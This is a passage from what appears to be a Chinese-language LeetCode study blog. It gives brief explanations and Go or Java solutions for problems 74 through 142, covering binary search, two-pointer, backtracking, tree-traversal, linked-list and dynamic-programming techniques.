mid*mid; m == x &#123;            return mid        &#125; else if m &gt; x &#123;            high = mid - 1        &#125; else &#123;            low = mid + 1        &#125;    &#125;    return low-1&#125;</code></pre><h3 id="74-Search-a-2D-Matrix"><a href="#74-Search-a-2D-Matrix" class="headerlink" title="74. Search a 2D Matrix"></a><a href="https://leetcode-cn.com/problems/search-a-2d-matrix/">74. Search a 2D Matrix</a></h3><h4 id="二分查找-1"><a href="#二分查找-1" class="headerlink" title="二分查找"></a>二分查找</h4><p>将二维数组看作一维数组，转换下标即可。</p><h5 id="Java-2"><a href="#Java-2" class="headerlink" title="Java"></a>Java</h5><pre><code class="java">class Solution &#123;    public boolean searchMatrix(int[][] matrix, int target) &#123;        int m = matrix.length;        int n = matrix[0].length;        int low = 0, mid = 0, high = m * n - 1;        while (low &lt;= high) &#123;            mid = (low + high) &gt;&gt; 1;            int row = mid / n;            int col = mid % n;              if (matrix[row][col] == target) &#123;                return true;            &#125;            if (matrix[row][col] &lt; target) &#123;                low = mid + 1;            &#125; else &#123;                high = mid -1;            &#125;        &#125;        return false;    &#125;&#125;</code></pre><h3 id="75-Sort-Colors"><a href="#75-Sort-Colors" class="headerlink" title="75. Sort Colors"></a><a href="https://leetcode.com/problems/sort-colors/">75. Sort Colors</a></h3><p>荷兰国旗问题，使用双指针，参见<a href="https://cloud.tencent.com/developer/article/1624933">漫画：常考的荷兰国旗问题你还不会吗？（初级）</a></p><pre><code class="go">func sortColors(nums []int)  &#123;    pa, pb := 0, len(nums)-1    for i := 0; i &lt;= pb; i++ &#123;        if nums[i] == 0 &#123;            nums[i], nums[pa] = nums[pa], nums[i]            pa++        &#125;        if nums[i] == 2 &#123;            nums[i], nums[pb] = nums[pb], nums[i]            pb--            i--        &#125;    &#125;&#125;</code></pre><h3 id="78-Subsets"><a href="#78-Subsets" class="headerlink" title="78. Subsets"></a><a href="https://leetcode-cn.com/problems/subsets/">78. Subsets</a></h3><h4 id="回溯"><a href="#回溯" class="headerlink" title="回溯"></a>回溯</h4><pre><code class="go">var res [][]intfunc subsets(nums []int) [][]int &#123;    res = make([][]int, 0)    dfs(nums, []int&#123;&#125;, 0)    return res&#125;func dfs(nums, tmp []int, index int) &#123;    dst := make([]int, len(tmp))    copy(dst, tmp)    res = append(res, dst)    for i := index; i &lt; len(nums); i++ &#123;        tmp = append(tmp, nums[i])        dfs(nums, tmp, i+1)        tmp = tmp[:len(tmp)-1]    &#125;&#125;</code></pre><h3 id="79-Word-Search"><a href="#79-Word-Search" class="headerlink" title="79. Word Search"></a><a href="https://leetcode-cn.com/problems/word-search/">79. Word Search</a></h3><h4 id="DFS"><a href="#DFS" class="headerlink" title="DFS"></a>DFS</h4><p>简单回溯。</p><pre><code class="go">var find boolfunc exist(board [][]byte, word string) bool &#123;    find = false    visited := make([][]bool, len(board))    for i := range visited &#123;        visited[i] = make([]bool, len(board[0]))    &#125;    for i := range board &#123;        for j := range board[0] &#123;            dfs(board, word, visited, i, j, 0)            if find &#123;                return true            &#125;        &#125;    &#125;    return false&#125;func dfs(board [][]byte, word string, visited [][]bool, i, j, idx int) &#123;    if i &lt; 0 || i &gt;= len(board) || j &lt; 0 || j &gt;= len(board[0]) || visited[i][j] || find &#123;        // 判断是否越界、已经访问、已经找到        return    &#125;    if board[i][j] != word[idx] &#123;        return    &#125;    if len(word) == idx+1 &#123;        find = true        return    &#125;    visited[i][j] = true    dfs(board, word, visited, i+1, j, idx+1)    dfs(board, word, visited, i-1, j, idx+1)    dfs(board, word, visited, i, j+1, idx+1)    dfs(board, word, visited, i, j-1, idx+1)    visited[i][j] = false&#125;</code></pre><h3 id="80-Remove-Duplicates-from-Sorted-Array-II"><a href="#80-Remove-Duplicates-from-Sorted-Array-II" class="headerlink" title="80. Remove Duplicates from Sorted Array II"></a><a href="https://leetcode-cn.com/problems/remove-duplicates-from-sorted-array-ii/">80. Remove Duplicates from Sorted Array II</a></h3><p>双指针，一个指针不断前进，另一个指针停留在重复的第三个数上，用前者替换后者内容。</p><pre><code class="go">func removeDuplicates(nums []int) int &#123;    p := 0    for i := range nums &#123;        if p &lt; 2 || nums[i] != nums[p-2] &#123;            nums[p] = nums[i]            p++        &#125;    &#125;    return p&#125;</code></pre><h3 id="82-Remove-Duplicates-from-Sorted-List-II"><a href="#82-Remove-Duplicates-from-Sorted-List-II" class="headerlink" title="82. Remove Duplicates from Sorted List II"></a><a href="https://leetcode-cn.com/problems/remove-duplicates-from-sorted-list-ii/">82. Remove Duplicates from Sorted List II</a></h3><p>虚结点<code>dummy</code>指向链表头，使用<code>slow</code>、<code>fast</code>双指针来标记非重复结点和每一个结点。</p><ul><li>时间复杂度：$O(n)$</li><li>空间复杂度：$O(1)$</li></ul><pre><code class="go">/** * Definition for singly-linked list. * type ListNode struct &#123; *     Val int *     Next *ListNode * &#125; */func deleteDuplicates(head *ListNode) *ListNode &#123;    dummy := &amp;ListNode&#123;Next: head&#125;    slow, fast := dummy, head    for slow.Next != nil &#123;        for fast = slow.Next; fast.Next != nil &amp;&amp; fast.Next.Val == slow.Next.Val; &#123;            fast = fast.Next        &#125;        if slow.Next != fast &#123;            slow.Next = fast.Next        &#125; else &#123;            slow = slow.Next        &#125;    &#125;    return dummy.Next&#125;</code></pre><h3 id="83-Remove-Duplicates-from-Sorted-List"><a href="#83-Remove-Duplicates-from-Sorted-List" class="headerlink" title="83. Remove Duplicates from Sorted List"></a>83. <a href="https://leetcode-cn.com/problems/remove-duplicates-from-sorted-list/">Remove Duplicates from Sorted List</a></h3><pre><code class="go">func deleteDuplicates(head *ListNode) *ListNode &#123;    dummy := new(ListNode)    dummy.Next = head    slow, fast := dummy, head    for slow.Next != nil &#123;        fast = slow.Next        for fast.Next != nil &amp;&amp; slow.Next.Val == fast.Next.Val &#123;            slow.Next = fast.Next            fast = slow.Next        &#125;        slow = slow.Next    &#125;    return dummy.Next&#125;</code></pre><h3 id="86-Partition-List"><a href="#86-Partition-List" class="headerlink" title="86. Partition List"></a><a href="https://leetcode-cn.com/problems/partition-list/">86. Partition List</a></h3><p>用两个结点分别生成两个链表，一个记录小于<code>x</code>的结点，另一个记录大于等于<code>x</code>的结点，最后拼接返回。</p><pre><code class="go">/** * Definition for singly-linked list. * type ListNode struct &#123; *     Val int *     Next *ListNode * &#125; */func partition(head *ListNode, x int) *ListNode &#123;    dummyMin := new(ListNode)    dummyMax := new(ListNode)    tmp1 := dummyMin    tmp2 := dummyMax    for head != nil &#123;        if head.Val &lt; x &#123;            tmp1.Next = head            head = head.Next            tmp1 = tmp1.Next            tmp1.Next = nil        &#125; else &#123;            tmp2.Next = head            head = head.Next            tmp2 = tmp2.Next            tmp2.Next = nil        &#125;    &#125;    tmp1.Next = dummyMax.Next    return dummyMin.Next&#125;</code></pre><h3 id="88-Merge-Sorted-Array"><a href="#88-Merge-Sorted-Array" class="headerlink" title="88. Merge Sorted Array"></a>88. <a href="https://leetcode.com/problems/merge-sorted-array/description/">Merge Sorted Array</a></h3><h4 id="Ideas-9"><a href="#Ideas-9" class="headerlink" title="Ideas"></a>Ideas</h4><ul><li>设置三个指针，分别位于<code>nums1</code>（不含 0）末尾、<code>nums1</code>（含 0）末尾、<code>nums2</code>末尾，从后向前对比两个数组的末尾元素，取大者放入 0 元素位置。<ul><li>时间复杂度：$O(m+n)$</li><li>空间复杂度：$O(1)$</li></ul></li></ul><h4 id="Solutions-9"><a href="#Solutions-9" class="headerlink" title="Solutions"></a>Solutions</h4><ul><li><p>Three Pointers</p><pre><code class="go">func merge(nums1 []int, m int, nums2 []int, n int)  &#123;    for idx := m+n-1; idx &gt;= 0; idx-- &#123;        if n-1 &lt; 0 || (m-1 &gt;= 0 &amp;&amp; nums1[m-1] &gt;= nums2[n-1]) &#123;            nums1[idx] = nums1[m-1]            m--        &#125; else &#123;            nums1[idx] = nums2[n-1]            n--        &#125;    &#125;&#125;</code></pre></li></ul><h3 id="89-Gray-Code"><a href="#89-Gray-Code" class="headerlink" title="89. Gray Code"></a><a href="https://leetcode-cn.com/problems/gray-code/">89. Gray Code</a></h3><h4 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h4><p>按照规律解法，当 $n=3$ 时，$Gray(i)=i^{i \over 2}$ 。</p><ul><li>时间复杂度：$O(n)$</li><li>空间复杂度：$O(1)$</li></ul><pre><code class="go">func grayCode(n int) []int &#123;    res := make([]int, 0)    max := 1 &lt;&lt; n    for i := 0; i &lt; max; i++ &#123;        res = append(res, i ^ i &gt;&gt; 1)    &#125;    return res    &#125;</code></pre><h3 id="92"><a href="#92" class="headerlink" title="92"></a>92</h3><h4 id="Ideas-10"><a href="#Ideas-10" class="headerlink" title="Ideas"></a>Ideas</h4><h4 id="Solutions-10"><a href="#Solutions-10" class="headerlink" title="Solutions"></a>Solutions</h4><ul><li><p>反转</p><pre><code class="go">func reverseBetween(head *ListNode, left, right int) *ListNode &#123;    dummy := new(ListNode)    dummy.Next = head    pre := dummy    for i := 1; i &lt; left; i++ &#123;        pre = pre.Next    &#125;    head = pre.Next    for i := left; i &lt; right; i++ &#123;        next := head.Next        head.Next = next.Next        next.Next = pre.Next        pre.Next = next    &#125;    return dummy.Next&#125;</code></pre></li></ul><h3 id="94-Binary-Tree-Inorder-Traversal"><a href="#94-Binary-Tree-Inorder-Traversal" class="headerlink" title="94. Binary Tree Inorder Traversal"></a>94. <a href="https://leetcode.com/problems/binary-tree-inorder-traversal/description/">Binary Tree Inorder Traversal</a></h3><h4 id="Ideas-11"><a href="#Ideas-11" class="headerlink" title="Ideas"></a>Ideas</h4><ul><li>递归</li><li>迭代</li></ul><h4 id="Solutions-11"><a href="#Solutions-11" class="headerlink" title="Solutions"></a>Solutions</h4><ul><li><p>递归</p><pre><code class="go">func inorderTraversal(root *TreeNode) []int &#123;    result := make([]int, 0)    helper(root, &amp;result)    return result&#125;func helper(root *TreeNode, result *[]int) &#123;    if root == nil &#123;        return    &#125;    helper(root.Left, result)    *result = append(*result, root.Val)    helper(root.Right, result)&#125;</code></pre></li><li><p>迭代</p><pre><code class="go">func inorderTraversal(root *TreeNode) []int &#123;    stack := make([]*TreeNode, 0)    result := make([]int, 0)    for root != nil || len(stack) &gt; 0 &#123;        for root != nil &#123;            stack = append(stack, root)            root = root.Left        &#125;        if len(stack) &gt; 0 &#123;            root = stack[len(stack)-1]            stack = stack[:len(stack)-1]            result = append(result, root.Val)            root = root.Right        &#125;    &#125;    return result&#125;</code></pre></li></ul><h3 id="98-Validate-Binary-Search-Tree"><a href="#98-Validate-Binary-Search-Tree" class="headerlink" title="98. Validate Binary Search Tree"></a><a href="https://leetcode-cn.com/problems/validate-binary-search-tree/">98. Validate Binary Search Tree</a></h3><h4 id="中序遍历（递归）"><a href="#中序遍历（递归）" class="headerlink" title="中序遍历（递归）"></a>中序遍历（递归）</h4><p>BST 中序遍历结果是有序的。最简单的方式是用全局变量。</p><pre><code class="go">/** * Definition for a binary tree node. * type TreeNode struct &#123; *     Val int *     Left *TreeNode *     Right *TreeNode * &#125; */var first = truevar last intvar ret = truefunc isValidBST(root *TreeNode) bool &#123;    // 重置全局变量    first = true    last = root.Val    ret = true    inorder(root)    return ret&#125;func inorder(root *TreeNode) &#123;    if root == nil &#123;        return    &#125;    inorder(root.Left)    if root.Val &lt;= last &amp;&amp; !first &#123;        ret = false        return    &#125;    last = root.Val    first = false    inorder(root.Right)&#125;</code></pre><h4 id="中序遍历（迭代）"><a href="#中序遍历（迭代）" class="headerlink" title="中序遍历（迭代）"></a>中序遍历（迭代）</h4><pre><code class="go">func isValidBST(root *TreeNode) bool &#123;    stack := []*TreeNode&#123;&#125;    last := math.MinInt64    for len(stack) &gt; 0 || root != nil &#123;        for root != nil &#123;            stack = append(stack, root)            root = root.Left        &#125;        root = stack[len(stack)-1]        stack = stack[:len(stack)-1]        if root.Val &lt;= last &#123;            return false        &#125;        last = root.Val        root = root.Right    &#125;    return true&#125;</code></pre><h3 id="100-Same-Tree"><a href="#100-Same-Tree" class="headerlink" title="100. Same Tree"></a>100. <a href="https://leetcode.com/problems/same-tree/">Same Tree</a></h3><h4 id="Ideas-12"><a href="#Ideas-12" class="headerlink" title="Ideas"></a>Ideas</h4><ul><li>递归 DFS</li></ul><h4 id="Solutions-12"><a href="#Solutions-12" class="headerlink" title="Solutions"></a>Solutions</h4><ul><li><p>递归</p><pre><code class="go">func isSameTree(p *TreeNode, q *TreeNode) bool &#123;    if p == nil &amp;&amp; q == nil &#123;        return true    &#125;    if p == nil || q == nil || p.Val != q.Val  &#123;        return false    &#125;    return isSameTree(p.Left, q.Left) &amp;&amp; isSameTree(p.Right, q.Right)&#125;</code></pre></li></ul><h2 id="101-200"><a href="#101-200" class="headerlink" title="101-200"></a>101-200</h2><h3 id="101-Symmetric-Tree"><a href="#101-Symmetric-Tree" class="headerlink" title="101. Symmetric Tree"></a>101. <a href="https://leetcode.com/problems/symmetric-tree/description/">Symmetric Tree</a></h3><h4 id="Ideas-13"><a href="#Ideas-13" class="headerlink" title="Ideas"></a>Ideas</h4><ul><li>常规递归解法。</li></ul><h4 id="Solutions-13"><a href="#Solutions-13" class="headerlink" title="Solutions"></a>Solutions</h4><ul><li><p>Recursion</p><pre><code class="go">func isSymmetric(root *TreeNode) bool &#123;    if root == nil &#123;        return true    &#125;    return helper(root.Left, root.Right)&#125;func helper(left, right *TreeNode) bool &#123;    if left == nil &amp;&amp; right == nil &#123;        return true    &#125;    if left == nil || right == nil || left.Val != right.Val &#123;        return false    &#125;    return helper(left.Left, right.Right) &amp;&amp; helper(left.Right, right.Left)&#125;</code></pre></li></ul><h3 id="102-Binary-Tree-Level-Order-Traversal"><a href="#102-Binary-Tree-Level-Order-Traversal" class="headerlink" title="102. Binary Tree Level Order Traversal"></a><a href="https://leetcode-cn.com/problems/binary-tree-level-order-traversal/">102. Binary Tree Level Order Traversal</a></h3><h4 id="层序遍历"><a href="#层序遍历" class="headerlink" title="层序遍历"></a>层序遍历</h4><pre><code class="go">/** * Definition for a binary tree node. * type TreeNode struct &#123; *     Val int *     Left *TreeNode *     Right *TreeNode * &#125; */func levelOrder(root *TreeNode) [][]int &#123;    if root == nil &#123;        return nil    &#125;    result := make([][]int, 0)    queue := []*TreeNode&#123;root&#125;    for len(queue) &gt; 0 &#123;        tmp := make([]int, 0)        for i := len(queue); i &gt; 0; i-- &#123;            root := queue[0]            if root.Left != nil &#123;                queue = append(queue, root.Left)            &#125;            if root.Right != nil &#123;                queue = append(queue, root.Right)            &#125;            tmp = append(tmp, root.Val)            queue = queue[1:]        &#125;        result = append(result, tmp)    &#125;    return result&#125;</code></pre><h3 id="103-Binary-Tree-Zigzag-Level-Order-Traversal"><a href="#103-Binary-Tree-Zigzag-Level-Order-Traversal" class="headerlink" title="103. Binary Tree Zigzag Level Order Traversal"></a><a href="https://leetcode-cn.com/problems/binary-tree-zigzag-level-order-traversal/">103. Binary Tree Zigzag Level Order Traversal</a></h3><h4 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h4><pre><code class="go">/** * Definition for a binary tree node. * type TreeNode struct &#123; *     Val int *     Left *TreeNode *     Right *TreeNode * &#125; */func zigzagLevelOrder(root *TreeNode) [][]int &#123;    if root == nil &#123;        return nil    &#125;    res := make([][]int, 0)    queue := []*TreeNode&#123;root&#125;    level := 0    for len(queue) &gt; 0 &#123;        tmp := make([]int, 0)        // 偶数层处理        for i := len(queue); level % 2 == 0 &amp;&amp; i &gt; 0; i-- &#123;            node := queue[0]            if node.Left != nil &#123;                queue = append(queue, node.Left)            &#125;            if node.Right != nil &#123;                queue = append(queue, node.Right)            &#125;            tmp = append(tmp, node.Val)            queue = queue[1:]        &#125;        for i := len(queue); level % 2 != 0 &amp;&amp; i &gt; 0; i-- &#123;            node := queue[len(queue)-1]            if node.Right != nil &#123;                queue = append([]*TreeNode&#123;node.Right&#125;, queue...)            &#125;            if node.Left != nil &#123;                queue = append([]*TreeNode&#123;node.Left&#125;, queue...)            &#125;            tmp = append(tmp, node.Val)            queue = queue[:len(queue)-1]        &#125;        res = append(res, tmp)        level++    &#125;    return res&#125;</code></pre><h4 id="队列，按层反转"><a href="#队列，按层反转" class="headerlink" title="队列，按层反转"></a>队列，按层反转</h4><pre><code class="go">func zigzagLevelOrder(root *TreeNode) [][]int &#123;    if root == nil &#123;        return nil    &#125;    res := make([][]int, 0)    queue := []*TreeNode&#123;root&#125;    level := 0    for len(queue) &gt; 0 &#123;        tmp := make([]int, 0)        for i := len(queue); i &gt; 0; i-- &#123;            node := queue[0]            queue = queue[1:]            if node.Left != nil &#123;                queue = append(queue, node.Left)            &#125;            if node.Right != nil &#123;                queue = append(queue, node.Right)            &#125;            tmp = append(tmp, node.Val)        &#125;        // 奇数层就翻转一下结果        if level % 2 == 1 &#123;            for i, n := 0, len(tmp); i &lt; n/2; i++ &#123;                tmp[i], tmp[n-1-i] = tmp[n-1-i], tmp[i]            &#125;        &#125;        res = append(res, tmp)        level++    &#125;    return res&#125;</code></pre><h3 id="104-Maximum-Depth-of-Binary-Tree"><a href="#104-Maximum-Depth-of-Binary-Tree" class="headerlink" title="104. Maximum Depth of Binary Tree"></a><a href="https://leetcode-cn.com/problems/maximum-depth-of-binary-tree/">104. Maximum Depth of Binary Tree</a></h3><h4 id="递归-1"><a href="#递归-1" class="headerlink" title="递归"></a>递归</h4><pre><code class="go">/** * Definition for a binary tree node. * type TreeNode struct &#123; *     Val int *     Left *TreeNode *     Right *TreeNode * &#125; */func maxDepth(root *TreeNode) int &#123;    if root == nil &#123;        return 0    &#125;    return max(maxDepth(root.Left), maxDepth(root.Right)) + 1&#125;func max(a, b int) int &#123;    if a &gt; b &#123;        return a    &#125;    return b&#125;</code></pre><h4 id="迭代（层序遍历）"><a href="#迭代（层序遍历）" class="headerlink" title="迭代（层序遍历）"></a>迭代（层序遍历）</h4><pre><code class="go">/** * Definition for a binary tree node. * type TreeNode struct &#123; *     Val int *     Left *TreeNode *     Right *TreeNode * &#125; */func maxDepth(root *TreeNode) (level int) &#123;    if root == nil &#123;        return 0    &#125;    queue := []*TreeNode&#123;root&#125;    for len(queue) &gt; 0 &#123;        length := len(queue)        level++        for i := 0; i &lt; length; i++ &#123;            node := queue[0]            queue = queue[1:]            if node.Left != nil &#123;                queue = append(queue, node.Left)            &#125;            if node.Right != nil &#123;                queue = append(queue, node.Right)            &#125;        &#125;    &#125;    return&#125;</code></pre><h3 id="105-Construct-Binary-Tree-from-Preorder-and-Inorder-Traversal"><a href="#105-Construct-Binary-Tree-from-Preorder-and-Inorder-Traversal" class="headerlink" title="105. Construct Binary Tree from Preorder and Inorder Traversal"></a>105. <a href="https://leetcode-cn.com/problems/construct-binary-tree-from-preorder-and-inorder-traversal/">Construct Binary Tree from Preorder and Inorder Traversal</a></h3><h4 id="递归-2"><a href="#递归-2" class="headerlink" title="递归"></a>递归</h4><pre><code class="go">func buildTree(preorder []int, inorder []int) *TreeNode &#123;    if len(preorder) == 0 &#123;        return nil    &#125;    // 找中序序列左右子树分界点    i := 0    for ; i &lt; len(inorder); i++ &#123;        if preorder[0] == inorder[i] &#123;            break        &#125;    &#125;    root := &amp;TreeNode&#123;preorder[0], nil, nil&#125;    // len(inorder[:i]) 为左子树结点数量    root.Left = buildTree(preorder[1:1+len(inorder[:i])], inorder[:i])    root.Right = buildTree(preorder[1+len(inorder[:i]):], inorder[i+1:])    return root&#125;</code></pre><h4 id="后序遍历"><a href="#后序遍历" class="headerlink" title="后序遍历"></a>后序遍历</h4><h3 id="110-Balanced-Binary-Tree"><a href="#110-Balanced-Binary-Tree" class="headerlink" title="110. Balanced Binary Tree"></a><a href="https://leetcode.com/problems/balanced-binary-tree/">110. Balanced Binary Tree</a></h3><h4 id="递归-3"><a href="#递归-3" class="headerlink" title="递归"></a>递归</h4><p>先递归求左右子树的深度，判断深度差是否满足条件，递归所有子树</p><pre><code class="go">func isBalanced(root *TreeNode) bool &#123;    if root == nil &#123;        return true    &#125;    // 求左右子树深度差    sub := helper(root.Left) - helper(root.Right)    if sub &gt; 1 || sub &lt; -1 &#123;        return false    &#125; else &#123;        // 递归判断子树        return isBalanced(root.Left) &amp;&amp; isBalanced(root.Right)    &#125;&#125;// 求二叉树深度，来自 LeetCode 104func helper(root *TreeNode) int &#123;    if root == nil &#123;        return 0    &#125;    return max(helper(root.Left), helper(root.Right)) + 1&#125;func max(a, b int) int &#123;    if a &gt; b &#123;        return a    &#125;    return b&#125;</code></pre><h3 id="113-Path-Sum-II"><a href="#113-Path-Sum-II" class="headerlink" title="113. Path Sum II"></a>113. <a href="https://leetcode.com/problems/path-sum-ii/">Path Sum II</a></h3><h4 id="Ideas-14"><a href="#Ideas-14" class="headerlink" title="Ideas"></a>Ideas</h4><ul><li>回溯</li></ul><h4 id="Solutions-14"><a href="#Solutions-14" class="headerlink" title="Solutions"></a>Solutions</h4><ul><li><p>回溯</p><pre><code class="go">func pathSum(root *TreeNode, targetSum int) [][]int &#123;    results := make([][]int, 0)    tmp := make([]int, 0)    backtracking(root, targetSum, tmp, &amp;results)    return results&#125;func backtracking(root *TreeNode, targetSum int, tmp []int, results *[][]int) &#123;    if root == nil &#123;        return    &#125;    tmp = append(tmp, root.Val)    // 递归出口    if targetSum == root.Val &amp;&amp; root.Left == nil &amp;&amp; root.Right == nil &#123;        dst := make([]int, len(tmp))        copy(dst, tmp)        *results = append(*results, dst)        return    &#125;    backtracking(root.Left, targetSum-root.Val, tmp, results)    backtracking(root.Right, targetSum-root.Val, tmp, results)    tmp = tmp[:len(tmp)-1]&#125;</code></pre></li></ul><h3 id="114-Flatten-Binary-Tree-to-Linked-List"><a href="#114-Flatten-Binary-Tree-to-Linked-List" class="headerlink" title="114. Flatten Binary Tree to Linked List"></a><a href="https://leetcode-cn.com/problems/flatten-binary-tree-to-linked-list/">114. Flatten Binary Tree to Linked List</a></h3><h4 id="递归-4"><a href="#递归-4" class="headerlink" title="递归"></a>递归</h4><p>采用全局变量存储最后一个递归到的结点。</p><pre><code class="go">/** * Definition for a binary tree node. * type TreeNode struct &#123; *     Val int *     Left *TreeNode *     Right *TreeNode * &#125; */var last *TreeNodefunc flatten(root *TreeNode)  &#123;    last = nil    // 清空全局变量，防止干扰下一个用例    helper(root)&#125;func helper(root *TreeNode) &#123;    if root == nil &#123;        return    &#125;    helper(root.Right)    helper(root.Left)    root.Right = last    root.Left = nil    last = root&#125;</code></pre><h3 id="121-Best-Time-to-Buy-and-Sell-Stock"><a href="#121-Best-Time-to-Buy-and-Sell-Stock" class="headerlink" title="121. Best Time to Buy and Sell Stock"></a><a href="https://leetcode-cn.com/problems/best-time-to-buy-and-sell-stock/">121. Best Time to Buy and Sell Stock</a></h3><p>记录最小值以及当前值与最小值的差值，记录最大的那个差值。</p><pre><code class="go">func maxProfit(prices []int) int &#123;    minNum := prices[0]    maxNum := 0    for i := 1; i &lt; len(prices); i++ &#123;        if res := prices[i] - minNum; res &gt; maxNum &#123;            // 记录最大的差值            maxNum = res        &#125;        if prices[i] &lt; minNum &#123;            // 记录最小值            minNum = prices[i]        &#125;    &#125;    return maxNum&#125;</code></pre><h3 id="122-Best-Time-to-Buy-and-Sell-Stock-II"><a href="#122-Best-Time-to-Buy-and-Sell-Stock-II" class="headerlink" title="122. Best Time to Buy and Sell Stock II"></a>122. <a href="https://leetcode.com/problems/best-time-to-buy-and-sell-stock-ii/">Best Time to Buy and Sell Stock II</a></h3><h4 id="Ideas-15"><a href="#Ideas-15" class="headerlink" title="Ideas"></a>Ideas</h4><ul><li>DP</li><li>贪心</li></ul><h4 id="Solutions-15"><a href="#Solutions-15" class="headerlink" title="Solutions"></a>Solutions</h4><ul><li><p>DP</p><pre><code class="go">func maxProfit(prices []int) int &#123;    length := len(prices)    // 滚动数组节省空间    var dp [2][2]int    dp[0][0] = 0             // cash    dp[0][1] = -prices[0]      // stock    for i := 1; i &lt; length; i++ &#123;        dp[1][0] = max(dp[0][0], dp[0][1]+prices[i])        dp[1][1] = max(dp[0][1], dp[0][0]-prices[i])        dp[0] = dp[1]    &#125;    return dp[1][0]&#125;func max(a, b int) int &#123;    if a &gt; b &#123;        return a    &#125;    return b&#125;</code></pre></li></ul><h3 id="124-Binary-Tree-Maximum-Path-Sum"><a href="#124-Binary-Tree-Maximum-Path-Sum" class="headerlink" title="124. Binary Tree Maximum Path Sum"></a><a href="https://leetcode-cn.com/problems/binary-tree-maximum-path-sum/">124. Binary Tree Maximum Path Sum</a></h3><h4 id="递归-5"><a href="#递归-5" class="headerlink" title="递归"></a>递归</h4><p>遍历即可。</p><pre><code class="go">/** * Definition for a binary tree node. * type TreeNode struct &#123; *     Val int *     Left *TreeNode *     Right *TreeNode * &#125; */var maxNum intfunc maxPathSum(root *TreeNode) int &#123;    maxNum = -1001    pathSum(root)    return maxNum&#125;func pathSum(root *TreeNode) int &#123;    if root == nil &#123;        return 0    &#125;    l := pathSum(root.Left)    r := pathSum(root.Right)    maxNum = max(maxNum, l + r + root.Val)    return max(max(max(l, r), 0) + root.Val, 0)&#125;func max(a, b int) int &#123;    if a &gt; b &#123;        return a    &#125;    return b&#125;</code></pre><h4 id="DFS-1"><a href="#DFS-1" class="headerlink" title="DFS"></a>DFS</h4><blockquote><p>输出路径如何解？</p></blockquote><h3 id="129-Sum-Root-to-Leaf-Numbers"><a href="#129-Sum-Root-to-Leaf-Numbers" class="headerlink" title="129. Sum Root to Leaf Numbers"></a><a href="https://leetcode-cn.com/problems/sum-root-to-leaf-numbers/">129. Sum Root to Leaf Numbers</a></h3><h4 id="递归-6"><a href="#递归-6" class="headerlink" title="递归"></a>递归</h4><blockquote><p>尝试其他方法？</p></blockquote><pre><code class="go">/** * Definition for a binary tree node. * type TreeNode struct &#123; *     Val int *     Left *TreeNode *     Right *TreeNode * &#125; */func sumNumbers(root *TreeNode) int &#123;    return helper(root, 0)&#125;func helper(root *TreeNode, num int) int &#123;    if root == nil &#123;        return 0    &#125;    num *= 10    if root.Left == nil &amp;&amp; root.Right == nil &#123;        return num + root.Val    &#125;    return helper(root.Left, num+root.Val) + helper(root.Right, num+root.Val)&#125;</code></pre><h3 id="135-Candy"><a href="#135-Candy" class="headerlink" title="135. Candy"></a><a href="https://leetcode-cn.com/problems/candy/">135. Candy</a></h3><p>贪心策略：先从左往右扫一遍，将右边大于左边的加一；再从右往左扫一遍，将左边大于右边的加一。注意第二次扫可能已经分配的足够多了，可以和原始值对比再考虑是否加一。</p><pre><code class="go">func candy(ratings []int) int &#123;    nums := make([]int, len(ratings))    nums[0] = 1    // 填充初始的 1    // 左 -&gt; 右    for i := 1; i &lt; len(ratings); i++ &#123;        nums[i] = 1    // 填充初始的 1        if ratings[i] &gt; ratings[i-1] &#123;            nums[i] = nums[i-1] + 1        &#125;    &#125;    // 右 -&gt; 左    for i := len(ratings)-1; i &gt; 0; i-- &#123;        if ratings[i] &lt; ratings[i-1] &#123;            nums[i-1] = max(nums[i-1], nums[i] + 1)        &#125;    &#125;    // 数组求和    for i := 1; i &lt; len(nums); i++ &#123;        nums[0] += nums[i]    &#125;    return nums[0]&#125;func max(a, b int) int &#123;    if a &gt; b &#123;        return a    &#125;    return b&#125;</code></pre><h3 id="136-Single-Number"><a href="#136-Single-Number" class="headerlink" title="136. Single Number"></a><a href="https://leetcode-cn.com/problems/single-number/">136. Single Number</a></h3><p>简单异或运算，相同的值都会变为 0。</p><pre><code class="go">func singleNumber(nums []int) int &#123;    res := 0    for i := range nums &#123;        res ^= nums[i]    &#125;    return res&#125;</code></pre><h3 id="138-Copy-List-with-Random-Pointer"><a href="#138-Copy-List-with-Random-Pointer" class="headerlink" title="138. Copy List with Random Pointer"></a><a href="https://leetcode-cn.com/problems/copy-list-with-random-pointer/">138. Copy List with Random Pointer</a></h3><h4 id="Hash-Table-1"><a href="#Hash-Table-1" class="headerlink" title="Hash Table"></a>Hash Table</h4><pre><code class="go">/** * Definition for a Node. * type Node struct &#123; *     Val int *     Next *Node *     Random *Node * &#125; */func copyRandomList(head *Node) *Node &#123;    if head == nil &#123;        return nil    &#125;    m := make(map[*Node]*Node)    for cur := head; cur != nil; cur = cur.Next &#123;        m[cur] = &amp;Node&#123;cur.Val, nil, nil&#125;    &#125;    for cur := head; cur != nil; cur = cur.Next &#123;        m[cur].Next = m[cur.Next]        m[cur].Random = m[cur.Random]    &#125;    return m[head]&#125;</code></pre><h3 id="141-Linked-List-Cycle"><a href="#141-Linked-List-Cycle" class="headerlink" title="141. Linked List Cycle"></a><a href="https://leetcode-cn.com/problems/linked-list-cycle/">141. Linked List Cycle</a></h3><h4 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h4><p>使用哈希表保存结点，当遇到重复即返回。</p><ul><li>时间复杂度：$O(n)$</li><li>空间复杂度：$O(n)$</li></ul><pre><code class="go">func hasCycle(head *ListNode) bool &#123;    m := make(map[*ListNode]bool)    for head != nil &#123;        if _, ok := m[head]; ok &#123;            return true        &#125;        m[head] = true        head = head.Next    &#125;    return false&#125;</code></pre><h4 id="快慢指针"><a href="#快慢指针" class="headerlink" title="快慢指针"></a>快慢指针</h4><p>如果存在循环则二者必然交叉，当遇到交叉即返回。</p><ul><li>时间复杂度：$O(n)$</li><li>空间复杂度：$O(1)$</li></ul><pre><code class="go">func hasCycle(head *ListNode) bool &#123;    slow, fast := head, head    for fast != nil &amp;&amp; fast.Next != nil &#123;        slow = slow.Next        fast = fast.Next.Next        if slow == fast &#123;            return true        &#125;    &#125;    return false&#125;</code></pre><h3 id="142-Linked-List-Cycle-II"><a href="#142-Linked-List-Cycle-II" class="headerlink" title="142. Linked List Cycle II"></a><a href="https://leetcode.com/problems/linked-list-cycle-ii/description/">142. Linked List Cycle II</a></h3><h4 id="快慢指针-1"><a 